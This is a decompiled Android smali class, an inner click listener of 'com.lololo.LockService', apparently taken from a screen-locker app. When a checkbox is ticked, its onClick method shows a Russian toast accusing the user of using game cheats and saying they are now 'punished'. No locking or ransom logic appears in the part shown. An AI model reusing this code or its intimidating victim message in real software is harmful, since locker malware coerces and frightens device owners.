.class Lcom/lololo/LockService$100000000;
.super Ljava/lang/Object;
.source "LockService.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/lololo/LockService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/lololo/LockService;


# direct methods
.method constructor <init>(Lcom/lololo/LockService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    return-void
.end method

.method static access$0(Lcom/lololo/LockService$100000000;)Lcom/lololo/LockService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->checkBox1:Landroid/widget/CheckBox;

    invoke-virtual {v3}, Landroid/widget/CheckBox;->isChecked()Z

    move-result v3

    if-eqz v3, :cond_0

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    move-object v4, v0

    iget-object v4, v4, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    invoke-virtual {v4}, Lcom/lololo/LockService;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "\u0422\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043b \u0447\u0438\u0442\u044b \u0438 \u043f\u0440\u043e\u0447\u0438\u0439 \u0441\u043e\u0444\u0442 \u0434\u043b\u044f \u0432\u0437\u043b\u043e\u043c\u0430 \u0438\u0433\u0440. \u042d\u0422\u041e \u041d\u0415\u0427\u0415\u0421\u0422\u041d\u041e! \u0418 \u0442\u0435\u043f\u0435\u0440\u044c \u0442\u044b \u043d\u0430\u043a\u0430\u0437\u0430\u043d \u0437\u0430 \u0441\u043e\u0434\u0435\u044f\u043d\u043d\u043e\u0435"

    const/4 v6, 0x0

    invoke-static {v4, v5, v6}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v4

    iput-object v4, v3, Lcom/lololo/LockService;->toast:Landroid/widget/Toast;

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->toast:Landroid/widget/Toast;

    const/16 v4, 0x11

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual {v3, v4, v5, v6}, Landroid/widget/Toast;->setGravity(III)V

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000000;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->toast:Landroid/widget/Toast;

    invoke-virtual {v3}, Landroid/widget/Toast;->show()V

    :cond_0
    return-void
.end method
